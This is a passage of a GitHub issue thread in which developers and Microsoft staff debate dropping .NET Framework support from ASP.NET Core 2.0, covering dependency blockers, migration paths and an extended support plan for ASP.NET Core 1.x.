We have lots of customers and we have new developers that have never seen .NET in their life. We need to cater to everyone because that's what we try to do as Microsoft. People running on .NET Framework know, love and understand it works so sure you understand that ASP.NET Core runs on .NET Framework but as a new developer approaching the platform, I would hope to never mention that as it muddies the story compared to something like `go` or `node` (which have pretty much 0 legacy at this point).

> My preference would be to work toward API parity within .NET Core and .NET Standard and .NET Framework. Also, figure out which is the one people should strive to target. As I believe was stated earlier, perhaps in a slightly different way, .NET Standard feels like a bandaid. Eventually, I'd expect .NET Core to be the only ""framework"" option and when that happens .NET Framework and .NET Standard go by the wayside. Myself, and I think with most whom have spoken up since the announcement, would like to be able to continue to benefit from the work you are doing on the ASP.NET Core side without having the freedom of what they are executing their code on top of being removed.

These things all happen in parallel. ASP.NET Core doesn't stop working on features until ""everything"" is ported over to .NET Core from .NET Framework. ASP.NET will continue to innovate and take advantage of APIs that are available on .NET Core since we ship as part of the same box.

"
458	"I see a few trending ideas on this thread from:

- I want you to support .NET Framework forever.
- I want to you support .NET Framework until the dependencies I need for my application are ported.
- I just need 1 more year, that will be enough time for me to drop .NET Framework support (ASP.NET Core 3.x).

There's also the fact that we didn't write an announcement (which is our fault) but one is coming (I promise, I blame the weekend). 

I also don't know what API parity looks like for most people here, my guess is it's different  for different people. .NET Framework is a 15+ year old solid, reliable, enterprise technology tied to Windows. 
.NET Core was made to write modern light weight cross-platform micro services and has slowly been evolving to be more compatible so that porting libraries was easier. That said, I don't know what it means to approach .NET Framework in terms of compatibility or if that's even a goal (it wasn't originally). At some point you will not be able to use ASP.NET Core on top of .NET Framework and there will be some dependency that can't be rewritten that isn't compatible with .NET Core. Applications will need to account for that when being designed with ASP.NET Core in mind (in some near future)."
459	"With respect to the projects I work on, a much-longer period of support for 1.1 would be a decent mitigation. It's unlikely we could drop netfx dependencies in 1 year but far more likely with the +3 years you suggested as a strawman. It'd be really nice to have a release where everything comes together at the 2.0 level first though - that's the point where everything was supposed to become easier to port! I'm only speaking for one organisation but ""2.0 will be a LTS release; 3.0 will drop netfx"" would basically be business as usual for us instead of a cause for FUD.

I'd also like to echo what @PureKrome said about appreciating this engagement, it has been a very informative discussion."
460	"On the topic of parity - I had previously assumed that .net core would *not* ever approach .net framework levels of compatibility, but that this was fine because *asp*.net core would continue to support both.

I think that as a community we basically use .net core in order to use asp.net core, not for its own merits. Like you said, they're one product, and I'd thought of the core clr as an optional part of that product with benefits and drawbacks if chosen."
461	"After sleeping over it for a night - 

I personally think it is a good idea to leave the old .net framework behind and write the best possible web framework for the modern runtime.

But you know that it is definitely risky and you might lose some of your customers here along the way (I hope not - but I do a lot of consulting - and .NET Core is for many companies out of reach right now - let's hope 2.0 changes that).

..and yea - communication around this was (as usual) something you can improve (most polite version of this sentence for a German) ;)"
462	+1
463	"> I personally think it is a good idea to leave the old .net framework behind and write the best possible web framework for the modern runtime.

I agree strongly. My hope was that this wold have been a gradual change, e.g. Kestrel dropping support first for perf (http.sys based hosting remaining), then mvc/* following for API and functionality improvements while porting / compatibility testing efforts for netstandard2.0 begin."
464	"> Excellent. In that case, as long as Microsoft ensures that 1.x is supported (all kinds of bug fixes and >operational support) until it offers customers a proper 2.x migration path (e.g. SignalR), then I am >comfortable biding my time until we need asp.net core 2.

+1

> able to port to .NET Core only (maybe during the development of ASP.NET Core on full framework you took some new dependencies that will never be ported as an example).

Totally agree.
Right now I think that is good decision. I think in ideal scenarios we need more than 1 year support, I dont known maybe 2-3 year, and information about what will be ported, for confidence of the community.
No .net 461 support.
"
465	"@dasMulli 

> I agree strongly. My hope was that this wold have been a gradual change, e.g. Kestrel dropping support first for perf (http.sys based hosting remaining), then mvc/* following for API and functionality improvements while porting / compatibility testing efforts for netstandard2.0 begin.

We don't even run performance tests on .NET Framework... Porting testing and improvements to .NET Core and .NET Standard will happen anyways, that IMO has no bearing on whether .NET Framework support is dropped or not. If anything, it makes us laser focus on those scenarios because it *the* only target."
466	"@gulbanana 

> It'd be really nice to have a release where everything comes together at the 2.0 level first though - that's the point where everything was supposed to become easier to port! I'm only speaking for one organisation but ""2.0 will be a LTS release; 3.0 will drop netfx"" would basically be business as usual for us instead of a cause for FUD.

Why do you need ASP.NET Core 2.0 (forget .NET Standard and .NET Core 2.0)?"
467	We don't particularly need the features in asp.net core 2.0. I would very much like to have the simpler build processes and interop that comes with the 2.0 wave.. will asp.net core 1.1, if running on netcoreapp2.0, be able to use netstandard2.0 libraries? Would that be considered a 'standard' and supported scenario rather than something which nobody tests or pays attention to?
468	Basically if 1.1 became LTS I worry about issues being closed eighteen months from now with 'well, you can do this using the 2.0 apis'..
469	"> We don't particularly need the features in asp.net core 2.0. I would very much like to have the simpler build processes and interop that comes with the 2.0 wave.. will asp.net core 1.1, if running on netcoreapp2.0, be able to use netstandard2.0 libraries? Would that be considered a 'standard' and supported scenario rather than something which nobody tests or pays attention to?

Of course that would work. As I've been saying all along the 3 things are completely decoupled today. Here's a sample project running ASP.NET Core 1.1 on .NET Core 2.0 using a version of System.Configuration APIs that have been ported to a .NET Standard 2.0 package:

https://github.com/davidfowl/AspNetCore1OnNetCore2"
470	"I'd be happier to accept this if there was an automatic interop layer between .NET Core and .NET Framework (not the current one that can throw exceptions at runtime, and not self-made internal WebAPI calls) - some kind of a wrapper (""WowNET""?) that would force us to keep 4.6-dependent code in separate .dlls but allow running legacy at the cost of performance (which in case of LOB apps is not the main concern). Do you think this would be technically possible?

I'm also wondering if this change means that full framework itself is approaching end of life and won't perform any other significant role than being a legacy component once most APIs are moved over to .NET Standard."
471	"> Basically if 1.1 became LTS I worry about issues being closed eighteen months from now with 'well, you can do this using the 2.0 apis'..

That's always a concern. The answer is always ""it depends"". Bug fixes are weighed accordingly and big features are likely to fall into that bucket more often than not."
472	"@rohatsu 

> I'd be happier to accept this if there was an automatic interop layer between .NET Core and .NET Framework (not the current one that can throw exceptions at runtime, and not self-made internal WebAPI calls) - some kind of a wrapper (""WowNET""?) that would force us to keep 4.6-dependent code in separate .dlls but allow to run legacy at the cost of performance (which in case of LOB apps is not the main concern). Do you think this would be technically possible?

Kinda like this https://docs.microsoft.com/en-us/windows/uwp/porting/desktop-to-uwp-root but for .NET Core and .NET Framework. We did something very similar when we ASP.NET supported Helios, a .NET Framework shim that was used to boostrap coreclr in IIS. The hacks to make it work were pretty ugly though it was a mix of COM and passing structures to the Main method via string[] args. All technically feasible though. I'm not sure what sort of fidelity you'd expect, as they aren't the same runtime and you can't pass objects back and forth. You'd also be running 2 GCs, 2 Jits tons more dlls in the same process and I'm not sure what you're gaining over doing something out of proc.

> I'm also wondering if this change means that full framework itself is approaching end of life and won't perform any other significant role than being a legacy component once most APIs are moved over to .NET Standard.

Far from. .NET Framework evolves and ships at the pace of windows as it is a windows component. We just released .NET Framework 4.7 (https://blogs.msdn.microsoft.com/dotnet/2017/04/05/announcing-the-net-framework-4-7/) as well with a bunch of new features. The fact is that .NET Core can and will ship faster because it isn't tied to anything else, so APIs, runtime features, etc will appear there first. It doesn't mean things won't eventually make their way to .NET Standard and .NET Framework. It'll just take longer to get there. The fact that .NET Framework updates in-place is the reason we're so careful when porting changes. Any change can break any application when an update is auto pushed to a billion machines 😉 . With .NET Core, the framework is side by side so applications need to opt in to the newer version to get newer features or fixes. There's just a lot more freedom there."
473	"Just to weigh in with the net4x libraries we currently today in ASP.NET Core 1.x, that wouldn't work in 2.0: EntityFramework 6. EFCore just has to many missing features we use missing (for example interception/lifecycle hooks). So we're stuck on EF6 for a while.

And according to @PinpointTownes 's post, EF6 does not work with the current (in development) version of ASP.NET Core 2.x."
474	@nphmuller then you'd keep using ASP.NET Core 1.x until more dependencies moved (I don't know how many things you require from EF Core and what the status is).
475	"@davidfowl Sure, if the support window from ASP.NET Core 1.x does not pass during that time.
The main feature is interception (lifecycle hooks). Other missing features can be worked around more easily for us. Interception is in their backlog, but not tied to a release. And my gut tells me it won't be implemented for a while."
476	"> @gulbanana: I think that as a community we basically use .net core in order to use asp.net core, not for its own merits.

Speak for yourself. There are a number of us for whom the primary benefit of .NET Core is getting off of Windows on the server."
477	And, I suppose, all you dirty Mac-owning hippies. 😝 
478	">@bradwilson And, I suppose, all you dirty Mac-owning hippies. 

Speak for yourself, some of us aren't hippies ;P

But yes, escaping Windows (or really, IIS and http.sys) is what I want .NET Core for along side xcopy deployment, perf, etc.  

Isolating old code in separate services or porting to ASP.NET Core does pay off for reasons other than new and shiny."
479	@PinpointTownes is a reference error, what happens if you reference System.Configuration as per https://github.com/aspnet/Home/issues/2022#issuecomment-299810945? EF6 says it has no dependencies due to everything being in ye'olde GAC/Full Framework bundle
480	"@benaadams and @PinpointTownes the reason its failing is because System.Configuration.ConfigurationManager isn't the DLL name that .NET Framework expects. I'm not sure if the port of System.Configuration is valid. 

```JSON
      ""system.configuration.configurationmanager/4.4.0-preview2-25308-01"": {
        ""dependencies"": {
          ""System.Security.Cryptography.ProtectedData"": ""4.4.0-preview2-25308-01""
        },
        ""runtime"": {
          ""lib/netstandard2.0/System.Configuration.ConfigurationManager.dll"": {}
        },
        ""compile"": {
          ""ref/netstandard2.0/System.Configuration.ConfigurationManager.dll"": {}
        }
```"
481	Yes, being able to run non-windows servers is great and a big draw.. but without asp.net core what would you run *on* them? Even Nancy for .net core relies on asp.net core via kestrel, UseOwin(), etc.
482	I've created several microservices that don't use ASP.NET Core.  They're stuff like worker processes that poll a queue to do it's work.  
483	"This is not fair, we follow roadmaps, and you didn't say anything about that before !!
If you said that before, we will not use ASP.NET Core in our project because we need .NET 4.x Libs.
Our planning includes updating our projects to ASP.NET Core 2 because of needed new functionalities.
We need ASP.NET Core 2 to target .NET 4.x too. if not possible, what about the support of ASP.NET Core 1.x, are you planning to add all new functionalities to it too or just fixing bugs."
484	"> Our planning includes updating our projects to ASP.NET Core 2 because of needed new functionalities.

Which ones?"
485	"> @PinpointTownes is a reference error, what happens if you reference System.Configuration as per #2022 (comment)?

Adding `<Reference Include=""System.Configuration"" />` has no effect (i.e the same exception is thrown), as it seems it can't be resolved from the GAC (not sure it's really surprising, tho'):

![image](https://cloud.githubusercontent.com/assets/6998306/25800621/6286af42-33ea-11e7-9fb5-e84fa7447525.png)

> I'm not sure if the port of System.Configuration is valid.

So the official conclusion is... you can't use a library written for .NET Framework 4.x on .NET Core if it uses `System.Configuration`?"
486	"@PinpointTownes I'm not even sure that version of `System.Configuration` is shipping (the one in the package). Maybe it is, maybe it isn't (that's a discussion to start on corefx). I'm just telling you why your sample broke the way it did.

> Adding <Reference Include=""System.Configuration"" /> has no effect (i.e the same exception is thrown), as it seems it can't be resolved from the GAC (not sure it's really surprising, tho'):

AFAIK, there's no default support for the GAC references in SDK projects. See https://github.com/dotnet/sdk/issues/987#issuecomment-286307697 to see how to enable it.

> So the official conclusion is... you can't use a library written for .NET Framework 4.x on .NET Core if it uses System.Configuration?

My conclusion is that you should open an issue on CoreFX with the sample your provided above."
487	"@davidfowl thank you for reply
Some needed features and helpers on EF Core are planned in 2.0 especially for mapping data (Self-contained type mappings)...
Anyway, I need just to have a clear idea about the roadmap of ASP.NET Core 1.x, our team is confused and worried."
488	">One thing I'm personally struggling with is the ""stable platform"" vs ""new features"" thing. On one hand, we want the platform to be stable and reliable and compatible, on the other hand nobody wants to stay on 1.x because it's doesn't have 2.x features. Are there super compelling features in ASP.NET Core 2.x that are pulling people in that direction or is it just the fact that we have more features than we had in 1.x (because it's new and shiny)?

@davidfowl I do think signlarR is one such feature, it would have been in my previous project atleast. However I also think a lot of the concern is due to the relatively short support windows for 1.1 (2018?) if people were assured they could run on asp.net 1.1 until they are ready to switch to core, meaning potentially, years,  and also be covered for patches that would calm people down a bit.

I also think asp.net core 1.1 support on .net core 2.0 is worth highliting even more, it gives people (what I think) a good migration path: asp.net 5 on 46 >asp.net core 1.x on 46 > asp.net core 1.x on .net core 2.0 > asp.net core 2 on .net core 2. That would be a path that would reduce the risk a lot of people worry about."
489	"I've been following this since the first day and even after all of these discussion and clarifications ( thanks @davidfowl ) I feel a lot of us are being thrown under the bus.

I understand the reasoning for cutting loose from Full/desktop .NET framework. Hell, I even agree that's the way to empower ASP.NET, BUT I fail to see how this is being decided now instead of from the beginning. 

Of course we customers would seriously complain in both scenarios, but I'd rather be in the ""I can't use the new shiny thing"" than bet on ""I can use it, invest in slowly migrate and replace when possible"" and just find out that's false."
490	">  I fail to see how this is being decided now instead of from the beginning.

At a guess:

On .NET Core 1.x you couldn't run Full framework libraries, so it would have been a complete break.

On .NET Core 2.x you can mostly run Full framework and can run .NET Standard 1.x - 2.0 libraries, so it isn't a major break. 

Any issues with running Full framework libraries on .NET Core 2.0, should probably be filed in [dotnet/corefx](https://github.com/dotnet/corefx)"
491	"It's clear that the main scenario is ""modern web apps on the cloud"", which often don't have many third party dependencies ( or are ""just code"" ones ). 

Most of the discussion so far has been focused on BCL availability, but many of us depend on third party components( low level integration with complex Video, Audio subsystems for example... ) that are often lagging on the .NET landscape and almost always rely on lower level technologies that probably don't end up being supported.

With ASP.NET Core 1, we are developing our modern services, targeting .NET standard for Libs and choosing to deploy on Full .NET or .NET Core per services dependencies. 

I could bet on this because in the case of finding unsupported features/components, we could easily target Full .NET. And the bet was on the long term platform, as staying on Full .NET looks like a decision to avoid in a few years.
"
492	"_On .NET Core 2.x you can mostly run Full framework and can run .NET Standard 1.x - 2.0 libraries, so it isn't a major break._

@benaadams  There is a big difference between being able to use most of the BCL and being able to use libraries that have been built for Full .NET ( and internally could use unsupported features in .NET Standard 2.0 / type unification).
"
493	"I guess this decision has no impact on easing the migration to ASP.NET Core 2.0 from ASP.NET 4?
Quite a few applications I manage could really profit from an update to ASP.NET Core 2.0, but since there is no OWIN/Katana Support for ASP.NET Core I guess I need to migrate manually and that is atm too much work. @damianh suggested similar in https://github.com/aspnet/AspNetKatana/issues/27"
494	"We are running on the full framework because we need EF6 (for spatial) and directory services and we are waiting on SignalR proper (currently using an unsupported version but it works). I havent checked any other blockers in a while but probably there are more.

As i understand it we'll now be blocked from moving to asp.net core 2.0 and getting signalr when it comes out.

We've been along for the ride since dnx, RC1 to RC2 and project json to csproj and finally it felt like we were out of the woods... now not so much.

I can understand this change coming eventually but is this really the time to do it when asp.net core is trying to gain traction? Also, my gut tells me EF Core isnt mature enough yet (and certainly not for spatial) and anyone betting on support in core is taking on more risk with regards to porting of libs.... waiting out another version for this transition seems like it would give some stability and a chance for EF Core and other ports to catch up not to mention signal r on the full framework.

I bet most of the enterprise is running asp.net core (which is great by the way) on the full framework and could well be in a similar position to us.
"
495	"Given this move to the fast train for ASP.NET Core, does that mean you'll introduce an LTS and Current version, and what will the support length be on this instances?

I guess I'm in the lucky instance where I am working on a greenfield solution that has had no requirements to run on netfx, _but_ it was always a nice to have if it could. The only thing that would be a blocker for me would be windows services which I am targeting netfx, but there is a plan for that."
496	"I feel this change is going in the wrong direction. I understand some features are core exclusive until netstandard catches up. But going this core-only route is a slippery slope into creating a fractured ecosystem.

This change makes a statement that I'm not sure I like: **It's OK to only target netcoreapp.**"
497	"I also wanted to write my opinion.

I believe that it's too early to drop .net framework. I don't know what's the problem of supporting .net framework + .net core together, but I believe this decision will make to migrate to AspNet Core a little harder. Because some companies think that: ""Let's start AspNet Core with .net core.. if we have serious problems (like a must-need library does not support it in the future) we can always turn back to .net framework"". But now that will not be possible anymore and companies will hesitate to start with AspNet Core. Also, this decision may make lower the value of .netstandard."
498	"@hikalkan

> Because some companies think that: ""Let's start AspNet Core with .net core.. if we have serious problems (like a must-need library does not support it in the future) we can always turn back to .net framework"". 

You can always use ASP.NET Core 1.1 though right?

> Also, this decision may make lower the value of .netstandard.

I don't see why that would be the case. As I said before, our cross cutting libraries still target .NET Standard as well as APIs that need to work across all of the .NET implementations. "
499	"Sure, they can use asp.net core 1.1. But it's not nice to say: ""ASP.NET Core's latest version is 2.x but you should use ASP.NET Core 1.x if you want to target .net framework"". That's not much different than saying ""use MVC 5.x"" :)

I believe .net core is the future (not future, even it's now!), but it's eary to drop .net framework (this decision will be understood by the community like .net framework is being obsolete)."
500	"> You can always use ASP.NET Core 1.1 though right?

there is not a clear benefit. First it is not mature yet, so it is a bet. 
Second, developers in ASP.Net Core  will not want to write in old tools and stay behind.
I am interested about few things.
1. We work already in greenfield project  fully in ASP.Net Core, Dapper, etc.
But in other projects, our business logic is in 4.6 assemblies. As I did read above, we should not have problem to reference them. I hope, I understood well about.
2. SignalR . DirectoryServices,  MS Orleans, Azure.
3. maybe irrelevant with the conversation above, but I want madly to host locally an ASP.Net Core with Kestrel or other HttpListener  as a UWP desktop application or  as  desktop bridge in UWP."
501	"Gotta say I'm pretty disappointed on the communication on this. I think we can live with the decision but it came out of no-where.

In July my team is starting work on a greenfield 12-18 month project that's going to run on ASP.NET Core 2.0 with all the cool stuff that we've been reading about for years in .NET Core. 

However in the mean-time we've got a ASP.NET MVC Core 1.0 app that is the center of our legacy product that essentially serves as a wrapper to call .NET Framework libraries. 

I confirmed with the team that their plan was to upgrade the app to ASP.NET MVC Core 2.0 and have it become part of the new app as we swap out the .NET Framework components. Now we're stuck with ASP.NET MVC Core 1.0 which will be EOL'ed before we finish the project."
502	"Just before I run my opinion, I would just like clarity on one part.
Would I be correct in making the assumption that if we want to continue using ASP.NET Core,
we will not be able to reference dll's that target .Net 4.5 or greater and have them work as they currently do?"
503	@louislewis2 No, that's not correct. You will be able to use `net45`-`net461` libraries, so long as they stay within the supported API space for `netstandard2.0`. You will not need to recompile those libraries.
504	"@bradwilson Thanks for the clarification. That will surely make me sleep better tonight.
Many of the libraries are not in our control, so that would have been a huge issue.

Very relieved now :)"
505	"@shanselman @DamianEdwards @davidfowl  For your list of items that we use which have not yet been ported, would be items in the system.management dll. We make use of the hardware identifiers specifically , this is used for automatic link generation for Azure Service Bus and our entire licensing server and client package. I imagine that with them not being the api currently, would cause us some serious issues?

https://github.com/dotnet/corefx/issues/3324
https://github.com/dotnet/corefx/issues/14762

This is our biggest holdup that keeps us running a few of our apps on the full framework."
506	"This puts us in an awkward situation.

I'm in the middle of porting our microservices from ASP.Net 4.5 self-hosted in-process on top of Kestrel (legacy compat reasons), to full self-hosted ASP.Net Core 1.x. However, we need to run these things on full framework, for now. And there are good reasons for that.

We have a number of hard Windows dependencies that are already part of our infrastructure and aren't subject to change. That includes NTLM auth, Event Log logging, etc. If ASP.Net Core 2.x are bailing out of netstandard support, then I may as well not do it at all. The problem is, there isn't any actively developed full framework alternative. Katana is dead and slow (by comparison).

If somebody could point me to a HTTP server that's as fast as Kestrel for .Net Framework, then sure. But that doesn't exist. So I just have to accept that ASP.Net is leaving actual production customers like me behind with this change.

If the stack needs all the new goodies, like Pipelines and Span, then those should be provided as netstandard libs. What APIs is ASP.Net Core 2.x using that are in netcoreapp2.0 that aren't in netstandard2.0, and why can't those APIs be made netstandard2.0 extension libs in the meantime?"
507	Are we seriously saying that MS spent 2 years working on a (net) standard across all of their frameworks only to turn around and release a flagship product that doesn't use this standard?
508	I think that GitHub Team will add Pagination feature for issues section because of this issue.
509	"@mattnischan 
> I'm in the middle of porting our microservices from ASP.Net 4.5 self-hosted in-process on top of Kestrel (legacy compat reasons), to full self-hosted ASP.Net Core 1.x. However, we need to run these things on full framework, for now. And there are good reasons for that.

You can keep using ASP.NET Core 1.x right?

> If the stack needs all the new goodies, like Pipelines and Span, then those should be provided as netstandard libs. What APIs is ASP.Net Core 2.x using that are in netcoreapp2.0 that aren't in netstandard2.0, and why can't those APIs be made netstandard2.0 extension libs in the meantime?

When APIs appear in .NET Standard that aren't in .NET Framework how are you going to use them?"
510	"@stefan2410 

You can use ASP.NET Core 1.x for that right? Which ASP.NET Core 2.0 features do you need? Is it just SignalR?"
511	"> Keep the app as is for the next two years but swap out the .NET Framework libraries with their .NET Core equivalent when done. This would keep our business logic etc shared between the two apps.
We can't do this as July 2018 is the deadline for ASP.NET MVC Core 1.0 support.

Once again, in my hypothetical world, we extend the lifetime of 1.x

> Upgrade the app to ASP.NET MVC Core 2.0 and have it become part of the new app as we swap out the .NET Framework components.
We can't do this either, as Core 2.0 doesn't support the .NET Framework so it's all or nothing.

Do you actually need ASP.NET Core 2.0? Or just .NET Core 2.0?"
512	"> When APIs appear in .NET Standard that aren't in .NET Framework how are you going to use them?

Our plan was: wait until they *are* in it. You said earlier that's just a matter of time, right? Lagging the bleeding edge by some fixed amount for the sake of stability would've been fine. Much better than falling permanently behind, at least. "
513	"@davidfowl 
I will move in ASP.Net core 2.0.  I don't have other solution. I can't say to the team to stay behind the evolution, we waited long time the ASP.Net Core.
As far as we don't have problems with our business logic 4.6 assemblies references.
I need SignalR,  DirectoryServices, not problems with Azure/Amazon libraries, MS Orleans.
Also maybe it is irrelevant with the conversation above, but I want for a desktop app to host locally an ASP.Net Core with Kestrel / HttpListener as a UWP desktop application or as desktop bridge in UWP. 
We can't rewrite the code for  XAML   and I would not like to use Electron."
514	"> You can keep using ASP.NET Core 1.x right?

For what timeframe? I can't see something like Event Log making it to netstandard.

> When APIs appear in .NET Standard that aren't in .NET Framework how are you going to use them?

Is this a thing? netstandard20 appears to still run on net461 according to the docs. Are you saying that the API under netstandard20 is not complete enough to implement the new goodies? Or, is there some plan to move netstandard beyond framework that is not yet divulged?"
515	"> Our plan was: wait until they are in it. You said earlier that's just a matter of time, right? Lagging the bleeding edge by some fixed amount for the sake of stability would've been fine. Much better than falling permanently behind, at least.

Libraries can be written on top of the standard. When things in the standard itself need to change it will take a lot longer to be adopted in all implementations of .NET and that includes .NET Framework. It can mean a couple of things:

- .NET Standard will evolve at the rate of the slowest implementation
- .NET Standard will evolve at some other pace and .NET Framework will be the last to catch up.

Of course it doesn't mean that libraries can't be written against it, it just means those caveats need to be taken into consideration when picking the version of .NET Standard you want to support."
516	"> Also maybe it is irrelevant with the conversation above, but I want for a desktop app to host locally an ASP.Net Core with Kestrel / HttpListener as a UWP desktop application or as desktop bridge in UWP.

ASP.NET Core on UWP isn't currently on any roadmap so I can't really say what's going to happen here. `HttpListener` is part of .NET Standard 2.0 though so maybe there's a chance that will work."
517	"I want to take a moment to thank everybody for their comments and feedback here. We really do appreciate it as well as your patience while we figure out the path forward. Please know that we didn't intend for this change to be so hard, so late, and without warning. Hindsight is 20/20 and if we knew what we knew now we would have communicated things earlier. We'll try harder moving forward.

We have a plan based on the feedback we've received here that I want to share with you before we post it as an announcement later this week with the 2.0.0-preview1 release. When that happens, we'll open a new issue to facilitate discussion around that plan, but for now go ahead and continue to share your thoughts and feedback here:

- Support for ASP.NET Core 1.x on .NET Framework will be extended for **at least** another year (until July 2019). We will reassess this annually and commit to providing 12 months notice before ending support of ASP.NET Core 1.x (so by July 2018 we’d announce whether we’re extending for another 12 months to July 2020) (*Side note: is anybody else freaked out by the fact we're talking about 2020 already? No? Ok, just me.*)
- The new SignalR will target and be fully supported on ASP.NET Core 1.x (coming later this year)
- We’ll continue to update ASP.NET Core 1.x to support new language versions, etc. like we do for `System.Web`
- ASP.NET Core 1.x running on .NET Core 1.x will be supported until July 2018 (no change)
- ASP.NET Core 1.x running on .NET Core 2+ will be supported as long as ASP.NET Core 1.x on .NET Framework is supported
  - This is to ensure there is always an overlap of a supported ASP.NET Core on a supported .NET Core while we support running on .NET Framework, allowing customers to port over time while staying on supported bits
- .NET Core 1.x support (as a runtime) doesn’t change. Ends in July 2018. Customers running ASP.NET Core 1.x need to move to .NET Core 2.0 or be on .NET Framework at that point (or move to ASP.NET Core 2.0 on .NET Core 2.0)
- We will port `System.DirectoryServices` and `System.Drawing` to .NET Core this year (fully supported, cross-platform, preview for at least Windows in Summer)
- The list of things to port to .NET Core after that currently includes `ServiceBase` (to support .NET Core Windows Services). No timeline yet other than it’s next (timelines obviously get more concrete as we work down the list). We’ll build on this list as we go based on customer feedback.
- We have no plan currently to port `System.ServiceModel` (server-side WCF) to .NET Core. The WCF for .NET Core may continue to be enhanced and have features added based on feedback, e.g. HTTP message encryption.
"
518	"@DamianEdwards @davidfowl a large part of the issue is that it can takes months of planning and dev effort whilst sacrificing a huge opportunity cost to commit to moving to ASP.NET Core where a lot of organizations wont to be able to move off from on .NET 4.x as it's the only platform they can be assured will be able to run all of their systems dependencies.

Up to this point MS has been marketing .NET Core aggressively as the future of ASP.NET where it's unclear whether development of ASP.NET 4.x has halted and if all future dev efforts are going to be invested in ASP.NET Core so there are going to be a lot of migrations underway to keep their systems current. A lot of people are going to feel like they've been thrown under a bus if that at the end result of all their efforts they've effectively migrated to an EOL'ed platform. This will hurt both organizations as well as the devs/consultants that were the biggest champions for initiating the move to .NET Core. They may not need anything from ASP.NET Core 2.0 now but they're definitely going to want have some headroom for their systems and be able to access some new features for all their efforts. 

I also don't get why existing ""legacy"" code is considered a liability when IMO it should be considered one of .NET's greatest assets, .NET Core would be nowhere near as appealing if it wasn't able to run existing .NET libraries. Java is still so strong because of JVM's massive and stable ecosystem which is more important than the inherent weakness in the language itself.

I don't think MS has even begun to feel the backlash from dropping .NET 4.x support which wont be broadly known until it's announced, I'd expect most devs here actively following development on GitHub are more interested in seeing new features then they are in interoperability and ensuring there's a smooth migration path for existing code bases. I'd be very surprised, but if you don't get any heat from this decision after it's announced than it might be the right one as maybe there aren't going to be that many people hurt by it.

Would it be too much effort to focus on a ASP.NET Core 2.0 stable/compatible release, then announce the .NET Core-only future for subsequent versions? Just seems like it's the fair thing to do in this situation given it was completely unforeseen."
519	"@DamianEdwards thanks for the update and a clear plan. I don't agree with it, but I still appreciate you laying it out.

There's still a huge fundamental gap here. The port to 1.x is almost entirely a lateral one, there are few features in it for us. 2.x is where some worthwhile upgrades are and we still have no guarantee we can ever make that move. There's a large chance that we spend a significant amount of time, money, and effort porting to 1.x only to be stranded there because of full framework dependencies. I will not make that gamble with our company. We may well end up with less support than we have on ASP.NET 4.x now.

Unless that changes, our apps will not be making the trip to ASP.NET Core, and all of our libraries will be far worse off for lack of dogfooding on it.

I sincerely hope you reconsider this decision. I hope one day we can make Stack Overflow take advantage of the thousands of personal hours we have devoted to help develop the .NET Core platform."
520	"@NickCraver 

> There's a large chance that we spend a significant amount of time, money, and effort porting to 1.x only to be stranded there because of full framework dependencies.

Throughout this thread, you called out System.DirectoryServices as one of the core things. I assume  you have some dependencies that you think will take a long time to get ported or ones that will never get ported. If 2.0 supported .NET Framework would those dependencies move in a year? 

> 2.x is where some worthwhile upgrades are and we still have no guarantee we can ever make that move.

Which ones? It would be good to know because we were discussing back porting some high importance things back to ASP.NET Core 1.1 to ease the transition.

> Unless that changes, our apps will not be making the trip to ASP.NET Core, and all of our libraries will be far worse off for lack of dogfooding on it.

I don't know anything about stackoverflow.com but is it possible to break pieces off (I don't want to say ""micro services"") so that ASP.NET Core could be used for some parts?"
521	"@mythz 

> This will hurt both organizations as well as the devs/consultants that were the biggest champions for initiating the move to .NET Core

Did you mean ASP.NET Core? Or .NET Core?"
522	@davidfowl I meant ASP.NET Core, but it also affects devs who were planning on a staged migration from ASP.NET Core/.NET 4.x first then .NET Core later.
523	Speaking of which, I've noticed that there's no libraries on ASP.NET Core/.NET Core for handling SAML. I have a requirement to handle SSO via a third party IdP, but I don't know if that'll be possible.
524	"> @davidfowl I meant ASP.NET Core, but it also affects devs who plan on a staged migration from ASP.NET Core .NET 4.x first then .NET Core later.

I don't see why that would be the case."
525	"I think that plan would probably be juuust enough for my org to avoid moving off the platform. The main thing is having a longer period with support (=security patches) during which remaining netfx deps can be rewritten or otherwise eliminated. It's all still kind of dicey and conceptually weird, though. What happens if three years from now we want to build a website which can ingest Excel documents or to embed a webserver in an app? What happens to other frameworks like Orleans building on top of the standard instead of netcoreapp? 

I seriously do not understand why so much work was done on netstandard2.0 if it wasn't ever going to be good enough for ASP.NET Core to actually use it."
526	"> What happens if three years from now we want to build a website which can ingest Excel documents 

Hard to say. I can't speak for the teams that own that but maybe it'll get ported to .NET Core and will work cross platform.

> or to embed a webserver in an app? 

`HttpListener` is part of netstandard 2.0.

> What happens to other frameworks like Orleans building on top of the standard instead of netcoreapp?

It's up to frameworks to decide if they want to run on .NET Framework, UWP, .NET Core, mono etc. It's a choice. Orleans doesn't ship with .NET Core. ASP.NET Core does. Those products are one and the same."
527	"What'll be a tough decision for us (and our clients) isn't about the libraries I have today, but the libraries I don't know if I'll need 6 months from now. There's a long tail of libraries and frameworks that don't support `netstandard` yet. For example, a month in to a project we realized that we needed a few features in NHibernate that weren't even close to there in EF6, let alone EF Core. So what would be my option there - target ASP.NET Core 1.x on full .NET?

Looks like I have some ApiPort in my future."
528	"> So what would be my option there - target ASP.NET Core 1.x on full .NET?

Yes. "
529	"> Hard to say. I can't speak for the teams that own that but maybe it'll get ported to .NET Core and will work cross platform.

Right, but surely it's within the purview of the asp.net team to decide whether it's worth providing access to that ecosystem of maybe-not-ported libraries. "
530	"> Right, but surely it's within the purview of the asp.net team to decide whether it's worth providing access to that ecosystem of maybe-not-ported libraries.

.NET is big and old, there's no way you can't expect the ASP.NET team to speak to the breath of libraries that exist in the .NET ecosystem. It's unrealistic. I just learnt what CSOM (https://msdn.microsoft.com/en-us/library/office/jj163123.aspx) was as part of this thread and I doubt it'll be ported but I couldn't say that for sure. 

Extending support for ASP.NET 1.1 on .NET Framework helps mitigate this a bit but I think it also helps because some dependencies *will* need to be isolated to properly move to ASP.NET Core on .NET Core (which is the intended future)."
531	"I will leave aside the libraries as that point has been discussed at length already. In our case (amilia.com, e-commerce SaaS) the third party tooling is already a showstopper, we can't even run ASP.NET Core on the full framework at the time being. I acknowledge this doesn't sound like a legitimate reason, but its a constraint we have to deal with. 

We could, in theory, replace those tools (i.e. profilers, monitoring, build servers, etc) with alternatives supporting .NET Core but that's a couple months of work I'd rather spend on solving more pressing issues. We'll make the migration eventually to ASP.NET Core/.NET Core, but right now it's quite a moving target."
